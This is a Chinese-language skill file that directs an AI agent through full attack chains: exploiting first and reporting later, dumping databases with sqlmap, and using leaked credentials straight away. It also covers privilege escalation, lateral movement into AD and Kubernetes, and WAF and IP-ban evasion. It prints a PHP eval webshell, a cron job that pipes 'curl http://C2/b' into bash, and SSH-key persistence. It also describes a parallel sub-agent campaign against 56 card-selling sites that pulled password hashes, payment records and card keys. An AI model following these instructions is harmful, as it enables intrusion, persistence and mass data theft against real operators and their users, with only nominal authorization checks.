---
name: attack-chain
description: >-
  攻击路径总指挥 — 深度优先、链式组合、反散弹。
  核心纪律：有产出的路不许换、每个发现回查组合链、卡住才换面。
  覆盖信息收集→突破→提权→横向。免杀/C2 走 edr-bypass-re。
---

# Attack Chain — 攻击路径总指挥

## ⛔ 三大铁律（最高优先级，覆盖所有其他规则）

### 铁律 1：有产出的路径不许换

**每一步都在产出新信息的路径 = 活路。活路不许换。**

- "产出"定义：返回了之前没有的数据（新端点、新凭据、新用户名、新错误码、新配置）
- 即使当前步骤还没达到最终目标（RCE/数据），只要每一步都有新信息就继续深挖
- **禁止行为**：发现 SQLi 注入点后"先看看其他面" → 错！立刻 sqlmap 提数据
- **禁止行为**：拿到一个低权 session 后"先扫一下其他端口" → 错！立刻用 session 测权限边界
- **禁止行为**：找到 .env 泄露后"记下来回头用" → 错！立刻用泄露的凭据尝试登录/连数据库

**判断标准：问自己"这一步比上一步知道了什么新东西？"**
- 新东西 → 继续深挖
- 和上一步相同的响应/错误 → 可能卡住了，但先变 1 个参数重试
- 连续 3 次相同结果且改了变量 → 才是死路，换面

### 铁律 2：每个发现必须回查组合链

**不是独立打每个漏洞，是把所有发现当成拼图碎片拼在一起。**

每发现一个新东西，立刻执行「组合回查」：

```
新发现 X 出现
  │
  ├─ 遍历所有之前的发现 [A, B, C, ...]
  │   ├─ X + A 能组合吗？（如：SSRF + 已知内网IP = 打内网）
  │   ├─ X + B 能组合吗？（如：JWT弱密钥 + 已知用户名 = 伪造token）
  │   └─ X + C 能组合吗？（如：文件读取 + 已知配置路径 = 读数据库密码）
  │
  ├─ 有可组合的 → 立刻执行组合链，这是最高优先级
  └─ 无可组合的 → 继续当前路径深挖
```

**常见组合模式（必须主动检查）**：

| 发现 A | + 发现 B | = 组合链 |
|--------|----------|----------|
| SSRF | 内网 IP/端口 | 打内网服务（Redis/ES/Nacos） |
| 文件读取(LFI) | 已知配置路径(.env/web.config) | 读出数据库密码/API Key |
| SQL 注入 | 已知表名/列名 | 精准 UNION 提数据 |
| 低权 session | 管理 API 路径 | IDOR/BFLA 提权 |
| JS 泄露 AK/SK | 云服务商已知 | 连云列桶/列实例 |
| 弱密钥/硬编码 | JWT/签名机制 | 伪造 token 登管理端 |
| 开放注册 | IDOR 参数 | 注册→拿 session→越权读其他用户 |
| 密码重置 | 用户枚举 | 枚举→重置→ATO |
| heapdump | Spring 框架 | 抽凭据→连数据库/打Nacos |
| phpinfo | disable_functions 列表 | 选对应绕过方法写马 |
| 回调/Webhook | 已知签名算法 | 伪造支付回调 |

### 铁律 3：死路判定必须严格——不是"试了一下不行"就换

**"卡住"的严格定义（必须全部满足才能判定死路）**：

1. 连续 3 次以上尝试，每次改了不同变量（不同参数/不同 payload/不同绕过方式）
2. 每次返回相同的拒绝响应（同样的状态码 + 同样的错误消息）
3. 不存在未尝试的已知绕过方法

**不算死路的情况（禁止在这些情况下换面）**：
- 只试了 1-2 次就想换 → 不够，至少 3 种变体
- 被 WAF 拦截但没试绕过 → 先走 `evasion-kit`
- 429 限流但没试换出口 → 先换代理
- 报错但没仔细看错误信息里是否泄露了新信息 → 先分析错误响应
- 要登录但没找完所有可能的凭据来源 → 先 heapdump/config/.env/JS

**换面时必须做的（防止丢链）**：
```
当前路径 P 判定为死路
  │
  ├─ 记录：P 走到了哪一步、为什么判定死路、什么条件能解锁 P
  ├─ 选择新路径 Q（优先选能解锁 P 的路径）
  └─ 如果 Q 产出了 P 需要的条件 → 立刻回到 P 继续
```

---

## 工作节奏：深度优先，不散弹

```
错误的散弹式（我们之前的问题）：
  扫一下端口 → 试一下弱口令 → 看一下JS → 扫一下目录 → 试一下SQLi → ...
  每个面都碰一下，没有一个打穿

正确的深度优先：
  指纹识别 → 选最可能的 1 条路 → 一路打到底
    ├─ 有产出 → 继续深挖（铁律1）
    ├─ 发现新东西 → 回查组合（铁律2）
    └─ 死路（铁律3严格判定）→ 才换下一条路
```

### 时间盒

- **单条路径不超过 60 分钟无新产出**：连续 60 分钟没有获得任何新信息（新端点、新数据、新错误码），判定卡住
- **爆破类操作最多 5 分钟**：一轮短字典（≤30次）打完立刻切面
- **整体任务定期回顾**：每 2-3 条路径走完后，回顾所有发现，做一次组合回查

---

## 路径选择优先级（选第一条路时用）

```
1. 信息泄露（成本最低收益最高）
   .env / .git / phpinfo / heapdump / JS硬编码 / swagger / actuator
   
2. 已知框架漏洞（有专卡直接打）
   指纹命中 → 走专卡（Spring/Shiro/TP/若依/GVA/FastAdmin/WordPress）
   
3. 未授权接口（不需要凭据就能利用）
   /api/ 无认证 → IDOR → 批量拉数据
   
4. 认证绕过（不靠爆破进系统）
   JWT弱密钥 / 2FA跳过 / 密码重置 / 注册提权 / 信任头
   
5. 注入类（需要找参数但成功率高）
   SQLi / SSTI / 命令注入 / XXE / SSRF
   
6. 文件操作（上传/读取/写入）
   上传 webshell / LFI 读配置 / 任意文件写
   
7. 弱口令（最低优先级，一轮就走）
   默认口令 5 组 → 短字典 1 轮 → 到此为止
```

---

## 发现记录格式（每个发现都要记）

```markdown
## Finding #N: [简短标题]
- **路径**: /api/xxx
- **类型**: SQLi / SSRF / 信息泄露 / ...
- **证据**: [curl 命令 + 响应关键部分]
- **可组合**: [检查与之前所有发现的组合可能性]
- **下一步**: [基于此发现的深挖方向]
```

---

## 指挥流程（拿到目标后）

```
1. 目标在 scope？ → 不在就 scope_expand --grant
2. 已有案卷？ → 有就读 STATUS.md，继续上次的路径
3. 指纹识别 → auto_campaign.py plan / strike_probe.py
4. 选最可能的 1 条路 → 深度优先打
5. 每个发现 → 回查组合链（铁律2）
6. 有组合 → 立刻执行组合链
7. 死路（铁律3严格判定）→ 记录 → 换面
8. 打穿 → 固化证据 → STATUS + findings
```

### 关键命令

```bash
# 指纹定级
python3 tools/ops/case_triage.py board
python3 tools/ops/auto_campaign.py plan -d <域名> --case <案卷>
python3 tools/ops/strike_probe.py -u https://<域名> --case <案卷>

# 假设路由
python3 tools/ops/hypothesis_route.py --signal "<当前面>"

# 对象矩阵（有身份就填）
python3 tools/ops/object_matrix.py init --case <案卷>
```

---

## 反模式清单（AI 常犯的错，全部禁止）

| 反模式 | 为什么错 | 正确做法 |
|--------|---------|----------|
| 发现 SQLi 后"先看看其他面" | 活路不许换（铁律1） | 立刻 sqlmap 提数据 |
| 拿到 session 后"再扫一遍端口" | 散弹式浪费时间 | 用 session 测 IDOR/越权 |
| 找到 .env 后只是"记录下来" | 没有执行（铁律1） | 立刻用凭据连数据库 |
| SQLi 拿到密码 + SSRF 分开报 | 没有组合（铁律2） | SQLi 拿密码 → SSRF 带凭据打内网 |
| 试了 1 次 WAF 拦截就换路 | 死路判定不严格（铁律3） | 至少 3 种绕过变体 |
| 429 后 sleep 等限流解除 | 浪费时间 | 换代理 或 换面 |
| 长时间爆破密码 | 最低 ROI | 一轮短字典后立刻切 |
| 探测了 20 个面每个都碰一下 | 散弹不深入 | 选 1 条最可能的深打 |
| 发现漏洞写报告而不利用 | 报告不是目标 | 先打穿再报告 |
| 旧发现重新报一遍 | 浪费上下文 | 读 STATUS.md |
| 回调伪造只测了签名没测金额 | 没组合 | 签名+金额+订单号一起测 |

---

## 真源

- 账本：`python3 tools/ops/case_ledger.py context <案卷>`
- 假设路由：`python3 tools/ops/hypothesis_route.py --signal "<当前面>"`
- 成套杀伤链：`docs/playbooks/成套杀伤链手法.md`
- 工具：`python3 tools/ops/kit_run.py --help`

## PoV 纪律（证据驱动）

没有可复现证据的"发现"不算数：
- 请求 + 响应差异（状态码/响应体/时序）
- 业务状态变化（数据库记录/文件落地/shell回连/余额变化）
- **展示层数据（排行榜/公告）≠ 脱库证据**，运营方可伪造

## 战后复盘（每次任务结束）

1. 哪条路打穿了？为什么？（沉淀到对应 Skill reference）
2. 哪条路走了弯路？为什么？（写进 Pitfalls）
3. 哪些发现本可以组合但当时没想到？（补进组合模式表）
4. 下次同类目标先打什么？（更新优先级）


---

## 外部库增量（2026-10-11 分享包）

## ACTION REQUIRED（读完后立刻执行）

0. `NOW`: 确认你当前是否已经加载了本 skill。如果还没加载，立刻 通过 skill 工具加载 `attack-chain` 加载。如果需要用到其他子 skill（如 pentest-tools），也一并加载。**不要只看不加载 — 用户曾指出过这个问题。**
0.5 `NOW`（2026-08 用户纠正）: **目标形态识别不等于流程前置**。收到目标类指令（渗透/打/测试/审计 XXX），即使目标是 TG bot / APP / 非 URL 形态，也必须先：①加载本 skill ②写 todo ③定义 DMZ 达成标准，**然后再**做目标识别/翻历史/读本地脚本。禁止"先确认目标再走流程"——确认目标的过程也必须发生在 todo 和 DMZ 定义之后。这条已写入 memory 阶段门。
1. `NOW`: 确认本次任务目标是用户明确提供的授权目标（RoE）；未授权目标立即停止，不执行
2. `NOW`: 确认当前任务是否命中本 skill 的适用范围
3. `NEXT`: 用 shell 检查工具可用性（`which`/`where`），缺工具用 `pip install` 或系统包管理器安装，不猜路径
4. `NEXT`: 缺工具时调用 bootstrap，不要猜路径
5. `ACT`: 进入"工作流"第一步并执行，不要停在确认状态

> ⚠️ 教训：skill 配置了不等于当前会话已加载。**必须在执行任务前完成 skill 加载，而不是等用户催。**

> 多阶段攻击路径规划与执行的总指挥。当任务需要"从 A 打到 B"的完整链路时，本 Skill 负责编排各阶段、协调子 Skill、规划攻击路径。
> 不是"红队专属"——任何需要跨阶段组合的渗透场景都从这里开始。
---

## 何时路由到本 Skill

以下场景**必须**先经过本 Skill 做全链路规划，再分发到具体子 Skill 执行：

| 场景 | 为什么需要编排 |
|------|--------------|
| "帮我做一次完整的渗透测试" | 需要规划从信息收集到报告的全流程 |
| "从外网打到域控" | 跨越边界突破→提权→横向→AD 多个阶段 |
| "HW 攻防演练" | 需要完整攻击链 + 隐蔽性 + 痕迹清理 |
| "评估这个目标的攻击面" | 需要多维度信息收集 + 路径规划 |
| "我拿到了一个 webshell，下一步怎么办" | 需要从当前据点规划后续路径 |
| "帮我规划攻击路径" | 明确需要路径编排 |
| "从这个漏洞能打到什么程度" | 需要评估漏洞的链式利用价值 |
| "Bug Bounty 持续监控" | 需要自动化多阶段流程 |
| "内网渗透全流程" | 横向移动 + 提权 + 域攻击组合 |
| "近源渗透方案" | 物理接入 + 内网渗透组合 |
| "供应链攻击路径" | 跨组织多跳攻击 |
| "钓鱼 + 后渗透" | 初始访问 + 后续利用组合 |
| "给一批目标做批量渗透" | 需要批量探测 + 优先级排序 + 逐点深入 |

**单阶段任务不需要经过本 Skill**：
- 只做端口扫描 → 直接去 `pentest-tools/`
- 只做 SQL 注入 → 直接去 `pentest-tools/`
- 只做 APK 逆向 → 直接去 `apk-reverse/`
- 只做域渗透 → 直接去 `pentest-tools/references/network-attack-defense.md`
---

## 编排原则

### 本 Skill 的角色

```
用户提出多阶段任务
 ↓
attack-chain/SKILL.md（本文件）
 ↓ 规划攻击路径、确定阶段顺序
 ↓ 评估每阶段所需工具和方法
 ↓
分发到具体子 Skill 执行：
 ├── pentest-tools/ → 工具调用、漏洞利用
 ├── apk-reverse/ → 移动端渗透
 ├── js-reverse/ → Web 前端突破
 ├── reverse-engineering/ → 二进制分析
 ├── ida-reverse/ → 深度逆向
 └── browser-automation/ → 自动化操作
 ↓
每阶段完成后回到本 Skill 评估下一步
 ↓
全部完成 → docs-generator 生成报告
```

### 路径规划决策树

```
拿到目标后：
1. 目标是什么？（Web/内网/云/移动/IoT）
2. 当前有什么？（外部视角/已有凭据/已有据点）
3. 最终目标是什么？（域控/数据/特定系统/证明影响）
4. 约束条件？（时间/隐蔽性/不可触碰的系统）
 ↓
根据以上信息规划最短路径
 ↓
一条路走不通 → 回到本 Skill 重新规划备选路径
```
---

## 第一阶段：侦察与信息收集

```
目标：绘制完整攻击面，不触碰目标
工具优先级：空间引擎(FOFA/Quake/Shodan) → 证书溯源 → 被动DNS → JS泄露 → WHOIS/备案
```

- **子域名**：`python3 tools/ops/origin_recon.py --domain <授权域> --case <案卷>`（证书CT+subdomain枚举）
- **端口/服务**：`python3 tools/ops/port_admin_scan.py scan --ip <IP> --case <案卷>`（常用管理端口8080/8888/9090/9200）
- **空间测绘**：Skill `fofa-search` / `quake`（`domain:"授权域"` → IP列表）
- **CDN源站穿透**：`python3 tools/ops/cf_backup_bypass.py scan --base https://授权站 --case <案卷>` + `origin_recon.py --domain <域> --case <案卷>`（crt 默认开）
- **JS/前端泄露**：`python3 tools/ops/js_secret_hunter.py hunt -u https://授权站 --case <案卷>`（AK/SK/hardcoded token/API endpoint）
- **框架指纹**：`python3 tools/ops/auto_campaign.py plan -d 授权站 --case <案卷>`

输出：攻击面清单 `exports/<案卷>/测绘/surface.json`

---

## 第二阶段：边界突破（初始访问）

```
目标：获得第一个可利用的立足点（任意账号 or 未授权读）
决策树：弱口令 → 未授权接口 → 公开漏洞（1day）→ 业务逻辑
```

| 突破面 | 命令 | 说明 |
|---|---|---|
| 弱口令 | `python3 tools/ops/auth_brute_probe.py -u https://授权站 --case <案卷>` | 限 24 次，locked=true 即停 |
| 未授权 API | `python3 tools/ops/core_web_surface_probe.py -u https://授权站 --case <案卷>` | XXE/SSTI/LFI/CORS全面探 |
| 中间件 | `python3 tools/ops/middleware_unauth_probe.py --host <IP> --case <案卷>` | Mongo/ES/Redis/Memcached |
| Java框架 | `python3 tools/ops/java_web_surface_probe.py -u https://授权站 --case <案卷>` | Shiro/Fastjson/XXL-JOB |
| 管理面板 | `python3 tools/ops/panel_surface_probe.py -u https://授权站 --case <案卷>` | 宝塔/phpMyAdmin/Nacos |
| 1day/Nuclei | `python3 tools/ops/nday_route.py --url https://授权站 --case <案卷>` | 按指纹钉对应CVE卡 |
| 支付链 | `python3 tools/ops/pay_matrix.py --base https://授权站 --case <案卷>` | 发现支付中转域→静默扩权 |

**业务逻辑突破（常被扫描工具漏掉）**：

- 密码重置逻辑：Skill `gambling-password-reset-ato`（无需爆破验证码）
- 注册绕过IDOR：Skill `register-bypass-idor`（无验证注册→拿合法session→拖库）
- 多租户越权：Skill `saas-multitenant-acl-testing`（FastAPI /openapi.json全量泄露）
- SSRF内网：`python3 tools/ops/ssrf_probe.py scan --base https://授权站 --case <案卷>`

---

## 第三阶段：权限提升

```
目标：从普通账号/低权shell拿到管理员/root
路线A（Web）：普通用户→管理API越权→超管session
路线B（主机）：低权shell→内核/SUID/sudo提权→root
```

**Web RBAC 垂直提权**：
- Skill `rbac-bypass-authz` → JWT篡改 `authorityId` / Method-Override / 角色字段写入
- GVA / Ruoyi：`python3 tools/ops/ginvue_admin_probe.py recon --base https://授权站 --case <案卷>`
- FastAdmin：`python3 tools/ops/fastadmin_daifu_probe.py dump-part --base https://授权站 --cookie …`

**Linux 主机提权**：
```bash
python3 tools/ops/linux_lpe_checker.py --local-only --json
# 重点：sudo -l / SUID find /usr -perm -4000 / crontab -l / /etc/passwd writable
# 环境变量劫持：$PATH写 / LD_PRELOAD / PYTHONPATH
# 内核：uname -r → searchsploit / dirtycow（≤4.8.3）/ CVE-2021-4034
```

**Windows 提权**：`python3 tools/ops/windows_lpe_checker.py`

**有身份必填对象矩阵**：`python3 tools/ops/object_matrix.py init --case <案卷>`
专卡阴性（自己格子 all ✗）→ 必须回表换格子，禁止直接写结案。

---

## 第四阶段：横向移动

```
目标：从当前据点扩展到更多资产
前提：有 shell 且目标内网在 scope 或已获授权扩展
```

- **内网资产测绘**：`python3 tools/ops/ad_surface_check.py --case <案卷>`（本机/已进内网只读认域，无 `--domain`）
- **内网扫描**：Skill `internal-tunnel` → 建代理（frp/chisel/ssh -D） → `python3 tools/tunnel-kit/internal_scan.py portscan --cidr 10.0.0.0/24 --case <案卷>`
- **凭据复用**：已获DB密码/哈希 → 测服务复用（SSH/RDP/SMB/Panel）
- **AD横向**：`python3 tools/ops/ad_surface_check.py` → BloodHound路径 → Kerberoasting → DCSync（需DA）
- **K8s/容器**：pod内 `env | grep KUBERNETES` → SA token → `kubectl get secrets -A`（Skill `K8s特权Pod手法.md`）

---

## 第五阶段：持久化

```
目标：维持访问（仅在授权时间窗内，结束前清理）
原则：最小足迹，授权窗结束前主动删除，不改原超管密
```

- **Web后门**：小马（`<?php @eval($_POST['c']);?>`）放非常规路径（不是webshell.php，用随机名）
- **计划任务**：`crontab -e` → `*/5 * * * * curl -s http://C2/b | bash`（授权C2，走443）
- **SSH密钥**：`echo pub_key >> ~/.ssh/authorized_keys`（记录写入了哪些机器，结束清）
- **合法账号**：后台创建二号账号（用户名非admin，记录在证据里）
- **禁止**：改原超管密码、耗余额下单、删站数据

---

## 第六阶段：规避与隐蔽

```
目标：绕过WAF/IDS/EDR/速率限制，保持行动有效
```

- **WAF绕过**：`python3 tools/evasion-kit/evasion.py encode --payload <payload> --waf <cloudflare|wts|safedog>`
 常用：`space2comment` / `charencode` / `randomcase` / `between` / `hex2char`
- **IP封锁**：被封立刻换出口，**只走 `config/proxy-nodes.txt`**（约493条），禁止SSH用户主机当跳板
 `python3 main.py proxy pick --http --probe --url-only`
- **速率控制**：sqlmap用 `--delay=1.5 --safe-freq=3`；ffuf用 `-p 0.5-2`；Nuclei用 `-rl 20`
- **流量伪装**：UA伪浏览器、Referer加目标主域、XFF头视情况加

---

## 第七阶段：固化证据与收尾

```
目标：落盘可验证证据，清理授权时间窗外的持久化
```

```bash
# 落证据
python3 tools/ops/case_report.py --case <案卷>
python3 tools/ops/evidence_gate.py --case <案卷> --from-status
python3 tools/ops/object_matrix.py check --case <案卷> --strict
# STATUS更新
# exports/<案卷>/STATUS.md → 填 L级、截图、curl命令

# 清理（授权结束前）
# 删后门文件：rm -f /path/to/shell.php
# 删计划任务：crontab -r (只删你加的那条)
# 删SSH密钥：从 authorized_keys 移除你加的行
# 删测试账号（如约定清）
# 不清：原有历史日志（别动，动了反而告警）
```

**结案前检查**：
- [ ] STATUS.md 有 L 级别和可复现 curl/截图
- [ ] `evidence_gate --from-status` 过线（口头结论对得上原文）
- [ ] 对象矩阵已填（有身份的格子），无「未测」结案
- [ ] 添加的后门/计划任务/账号已清理
- [ ] 未碰原超管密码、未删业务数据

---

## 批量目标工作流

当拿到多个目标（如 50+ 卡密/发卡网站列表）时：

1. **去重** — 按 host:port 去重，去除重复条目
2. **批量存活探测** — concurrent.futures ThreadPoolExecutor(max_workers=20) 并行请求，4-6秒完成 50+ 目标
3. **框架识别** — 检查 title、body 中是否包含 RuoYi/GVA/独角数卡 等特征
4. **分类排序** — 按框架类型分组，优先处理已知框架（GVA > RuoYi > 自建系统）
5. **逐点深入** — 每个目标按对应框架的渗透流程走
6. **记录存活表** — 产出 {ID, URL, 状态码, 框架, 标题} 表格

### delegate_task 并行渗透执行模式（2026-07-16 实战验证）

50+ 目标不要逐个手动搞。**先分类，再并行下发**：

```text
第1轮：分类 + 批量探测
 并发 delegate_task(3个):
 - 已知框架组（若依/GVA/DCSHOP/EMSHOP等）
 - TG发卡机器人后台组（FastAPI/Swagger特征）
 - 通用发卡站组（DCAT/Laravel/FAKA/Next.js等）

第2轮：重点目标深度渗透
 探测到高风险目标（Swagger泄露/开放注册/默认密码可用）后
 再次 delegate_task 下发深度渗透：
 - 验证码OCR自动识别（ddddocr）
 - 注册账号遍历数据
 - 管理后台登录爆破

第3轮：数据提取（注意：用户要的是数据库数据，不是前端结构）
 拿到后台权限后：
 - 提取用户表（密码hash）、订单表（支付信息）、系统配置
 - 每个目标单独目录，JSON格式保存
 - 重点导出：用户密码、订单金额/支付方式、充值卡密、API key
```

**经验教训（2026-07-16）**: 56个TG发卡目标通过3轮delegate_task+2轮深度探测完成渗透，7个拿到后台权限，2个Swagger全泄露。context中必须注明"用中文回复"避免子代理默认英文输出。

### 常见PHP发卡系统渗透要点

| 系统 | 后台路径 | 登录方式 | 突破口 |
|------|----------|----------|--------|
| DCSHOP/EMSHOP | /admin/ → account.php?action=signin | user+pw表单 | 默认密码admin/admin123 |
| 独角数卡/彩虹发卡 | /admin/authentication/login | email+密码+验证码 | 开放注册普通用户 |
| FAKA引擎 | /admin/ → /admin/auth/login | 用户名+密码 | 默认密码admin/admin |
| 自定义PHP发卡v3.x | /admin/authentication/login | email+密码+验证码+可选2FA | 验证码可OCR；管理员邮箱需枚举 |

**共同特征**:
- 自定义404页面返回HTTP 200（检查内容体而非状态码）
- 前台注册通常开放（可注册普通用户）
- 管理员强制email格式登录（"admin"不是有效邮箱）
- 验证码为50×24 2色调色板PNG（ddddocr可直接识别）
- 管理员/用户登录分离（普通用户session无法访问admin API）
---

## 任务完成自检（声称完成前 MUST 通过）

- [ ] 我是否已经加载了所有需要用到的 skill 到当前会话？
- [ ] 我是否执行了工作流中的每一步（而不是只阅读）？
- [ ] 我是否用 `which`/`where` 核对了真实工具路径？
- [ ] 我是否产出了可复现证据（命令/脚本/截图/报告）？
- [ ] 我是否完成并回写了 RULES 要求的 Checklist 项？
